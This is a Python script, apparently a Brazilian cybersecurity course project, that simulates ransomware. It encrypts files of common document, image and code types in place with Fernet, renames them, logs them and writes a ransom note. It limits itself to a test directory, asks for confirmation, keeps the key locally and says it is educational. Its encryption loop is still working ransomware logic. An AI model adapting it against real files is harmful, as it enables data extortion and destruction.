#!/usr/bin/env python3
# -*- coding: utf-8 -*-
"""
Ransomware Simulado - APENAS PARA FINS EDUCACIONAIS
====================================================

Desenvolvido por: Hevellyn
Curso: DIO - Ciberseguran√ßa
Data: Novembro/2025

AVISO: S√≥ use isso pra fins educacionais!
        N√£o execute em arquivos importantes sem backup.

Esse script simula um ransomware b√°sico que criptografa arquivos
em um diret√≥rio de teste. Implementei usando a biblioteca Fernet
que √© bem segura e sim√©trica.

TODO: Talvez adicionar mais tipos de arquivo depois
TODO: Melhorar a mensagem de resgate
"""

import os
import sys
from pathlib import Path
from cryptography.fernet import Fernet
import json
from datetime import datetime


class RansomwareSimulado:
    """
    Classe que simula um ransomware educacional.
    
    Esta classe implementa funcionalidades b√°sicas de um ransomware:
    - Gera√ß√£o de chave de criptografia
    - Varredura de arquivos
    - Criptografia de arquivos
    - Gera√ß√£o de mensagem de resgate
    """
    
    def __init__(self, diretorio_alvo="test_files"):
        """
        Inicializa o ransomware simulado.
        
        Args:
            diretorio_alvo (str): Diret√≥rio onde os arquivos ser√£o criptografados
        """
        self.diretorio_alvo = Path(diretorio_alvo)
        self.chave = None
        self.cipher = None
        self.arquivos_criptografados = []
        
        # Extens√µes de arquivo que ser√£o criptografadas
        self.extensoes_alvo = [
            '.txt', '.doc', '.docx', '.pdf', '.jpg', '.png',
            '.xlsx', '.csv', '.json', '.xml', '.py'
        ]
        
    def gerar_chave(self):
        """Gera chave de criptografia"""
        self.chave = Fernet.generate_key()
        self.cipher = Fernet(self.chave)
        
        # Salvo a chave em arquivo
        # Em um ransomware real, o atacante guardaria isso pra pedir resgate
        with open('chave_secreta.key', 'wb') as arquivo_chave:
            arquivo_chave.write(self.chave)
        
        print(f"[+] Chave de criptografia gerada e salva em 'chave_secreta.key'")
        return self.chave
    
    def encontrar_arquivos(self):
        """
        Varre o diret√≥rio alvo procurando arquivos para criptografar.
        
        Returns:
            list: Lista de caminhos de arquivos encontrados
        """
        arquivos_encontrados = []
        
        if not self.diretorio_alvo.exists():
            print(f"[!] Diret√≥rio '{self.diretorio_alvo}' n√£o existe!")
            return arquivos_encontrados
        
        print(f"[*] Varrendo diret√≥rio: {self.diretorio_alvo}")
        
        for arquivo in self.diretorio_alvo.rglob('*'):
            if arquivo.is_file() and arquivo.suffix in self.extensoes_alvo:
                arquivos_encontrados.append(arquivo)
                print(f"    Arquivo encontrado: {arquivo.name}")
        
        print(f"[+] Total de arquivos encontrados: {len(arquivos_encontrados)}")
        return arquivos_encontrados
    
    def criptografar_arquivo(self, caminho_arquivo):
        """Criptografa um arquivo"""
        try:
            # L√™ o arquivo original
            with open(caminho_arquivo, 'rb') as arquivo:
                conteudo = arquivo.read()
            
            # Criptografa (essa parte foi complicada de entender no in√≠cio!)
            conteudo_criptografado = self.cipher.encrypt(conteudo)
            
            # Sobrescreve o arquivo
            with open(caminho_arquivo, 'wb') as arquivo:
                arquivo.write(conteudo_criptografado)
            
            # Adiciona .encrypted no final do nome
            novo_nome = str(caminho_arquivo) + '.encrypted'
            os.rename(caminho_arquivo, novo_nome)
            
            self.arquivos_criptografados.append({
                'original': str(caminho_arquivo),
                'criptografado': novo_nome,
                'timestamp': datetime.now().isoformat()
            })
            
            print(f"[+] Arquivo criptografado: {caminho_arquivo.name}")
            return True
            
        except Exception as e:
            print(f"[!] Erro ao criptografar {caminho_arquivo.name}: {str(e)}")
            return False
    
    def criptografar_todos(self):
        """
        Criptografa todos os arquivos encontrados no diret√≥rio alvo.
        
        Returns:
            int: N√∫mero de arquivos criptografados com sucesso
        """
        if not self.chave:
            print("[!] Erro: Chave de criptografia n√£o foi gerada!")
            return 0
        
        arquivos = self.encontrar_arquivos()
        
        if not arquivos:
            print("[!] Nenhum arquivo para criptografar!")
            return 0
        
        print(f"\n[*] Iniciando criptografia de {len(arquivos)} arquivo(s)...")
        print("=" * 60)
        
        contador = 0
        for arquivo in arquivos:
            if self.criptografar_arquivo(arquivo):
                contador += 1
        
        print("=" * 60)
        print(f"[+] Criptografia conclu√≠da: {contador}/{len(arquivos)} arquivos")
        
        # Salva log dos arquivos criptografados
        self.salvar_log()
        
        return contador
    
    def salvar_log(self):
        """
        Salva um log dos arquivos criptografados em formato JSON.
        """
        log_data = {
            'timestamp': datetime.now().isoformat(),
            'total_arquivos': len(self.arquivos_criptografados),
            'arquivos': self.arquivos_criptografados
        }
        
        with open('ransomware_log.json', 'w', encoding='utf-8') as f:
            json.dump(log_data, f, indent=4, ensure_ascii=False)
        
        print(f"[+] Log salvo em 'ransomware_log.json'")
    
    def gerar_mensagem_resgate(self):
        """
        Gera uma mensagem de "resgate" simulada.
        """
        mensagem = """
‚ïî‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïó
‚ïë                                                                ‚ïë
‚ïë                    ‚ö†Ô∏è  ATEN√á√ÉO - SEUS ARQUIVOS                ‚ïë
‚ïë                     FORAM CRIPTOGRAFADOS! ‚ö†Ô∏è                   ‚ïë
‚ïë                                                                ‚ïë
‚ï†‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ï£
‚ïë                                                                ‚ïë
‚ïë  Todos os seus arquivos foram criptografados com um algoritmo  ‚ïë
‚ïë  militar de seguran√ßa. Sem a chave de descriptografia, √©       ‚ïë
‚ïë  imposs√≠vel recuperar seus dados.                              ‚ïë
‚ïë                                                                ‚ïë
‚ïë  üìÅ Arquivos afetados: {num_arquivos:>3}                               ‚ïë
‚ïë  üîê Algoritmo: Fernet (AES-128)                                ‚ïë
‚ïë  ‚è∞ Data: {data}                              ‚ïë
‚ïë                                                                ‚ïë
‚ï†‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ï£
‚ïë                                                                ‚ïë
‚ïë                  ‚ö†Ô∏è  ISTO √â UMA SIMULA√á√ÉO! ‚ö†Ô∏è                  ‚ïë
‚ïë                                                                ‚ïë
‚ïë  Este √© um projeto EDUCACIONAL. Para descriptografar seus     ‚ïë
‚ïë  arquivos, execute o script 'decryptor.py' com a chave que    ‚ïë
‚ïë  foi salva em 'chave_secreta.key'.                            ‚ïë
‚ïë                                                                ‚ïë
‚ïë  Comando: python decryptor.py                                  ‚ïë
‚ïë                                                                ‚ïë
‚ïë  üéì Projeto desenvolvido para fins de aprendizado em           ‚ïë
‚ïë     Ciberseguran√ßa - DIO.ME                                    ‚ïë
‚ïë                                                                ‚ïë
‚ïö‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïù
        """.format(
            num_arquivos=len(self.arquivos_criptografados),
            data=datetime.now().strftime("%d/%m/%Y %H:%M:%S")
        )
        
        # Salva a mensagem em arquivo
        with open('LEIA_ME_URGENTE.txt', 'w', encoding='utf-8') as f:
            f.write(mensagem)
        
        print(mensagem)
        print("\n[+] Mensagem de resgate salva em 'LEIA_ME_URGENTE.txt'")


def criar_arquivos_teste():
    """
    Cria arquivos de teste para demonstra√ß√£o do ransomware.
    """
    print("[*] Criando arquivos de teste...")
    
    test_dir = Path("test_files")
    test_dir.mkdir(exist_ok=True)
    
    arquivos_teste = {
        'documento_importante.txt': 'Este √© um documento importante com informa√ß√µes confidenciais.',
        'relatorio.txt': 'Relat√≥rio financeiro do m√™s de novembro de 2025.',
        'senhas.txt': 'Lista de senhas importantes:\n- Email: senha123\n- Banco: senha456',
        'notas.txt': 'Notas de reuni√£o:\n1. Projeto X\n2. Projeto Y\n3. Projeto Z',
        'dados.json': '{"nome": "Jo√£o", "idade": 30, "cidade": "S√£o Paulo"}'
    }
    
    for nome_arquivo, conteudo in arquivos_teste.items():
        caminho = test_dir / nome_arquivo
        with open(caminho, 'w', encoding='utf-8') as f:
            f.write(conteudo)
        print(f"    Criado: {nome_arquivo}")
    
    print(f"[+] {len(arquivos_teste)} arquivos de teste criados em '{test_dir}'\n")


def main():
    """
    Fun√ß√£o principal do ransomware simulado.
    """
    print("\n" + "=" * 60)
    print("  RANSOMWARE SIMULADO - APENAS PARA FINS EDUCACIONAIS")
    print("=" * 60)
    print("\n‚ö†Ô∏è  AVISO: Este script √© apenas para fins educacionais!")
    print("    Execute apenas em ambientes de teste controlados.\n")
    
    # Pergunta ao usu√°rio se deseja continuar
    resposta = input("Deseja continuar com a simula√ß√£o? (sim/n√£o): ").lower()
    
    if resposta not in ['sim', 's', 'yes', 'y']:
        print("\n[*] Opera√ß√£o cancelada pelo usu√°rio.")
        sys.exit(0)
    
    # Pergunta se deseja criar arquivos de teste
    criar_teste = input("\nDeseja criar arquivos de teste? (sim/n√£o): ").lower()
    if criar_teste in ['sim', 's', 'yes', 'y']:
        criar_arquivos_teste()
    
    # Inicializa o ransomware
    print("[*] Inicializando ransomware simulado...")
    ransomware = RansomwareSimulado()
    
    # Gera a chave de criptografia
    print("\n[*] Gerando chave de criptografia...")
    ransomware.gerar_chave()
    
    # Criptografa os arquivos
    print("\n[*] Iniciando processo de criptografia...\n")
    num_criptografados = ransomware.criptografar_todos()
    
    if num_criptografados > 0:
        # Gera a mensagem de resgate
        print("\n[*] Gerando mensagem de resgate...")
        ransomware.gerar_mensagem_resgate()
        
        print("\n" + "=" * 60)
        print("  SIMULA√á√ÉO CONCLU√çDA COM SUCESSO!")
        print("=" * 60)
        print("\nüìö Pr√≥ximos passos:")
        print("   1. Examine os arquivos criptografados em 'test_files/'")
        print("   2. Analise o arquivo 'ransomware_log.json'")
        print("   3. Use 'decryptor.py' para recuperar os arquivos")
        print("\n")
    else:
        print("\n[!] Nenhum arquivo foi criptografado!")


if __name__ == "__main__":
    main()
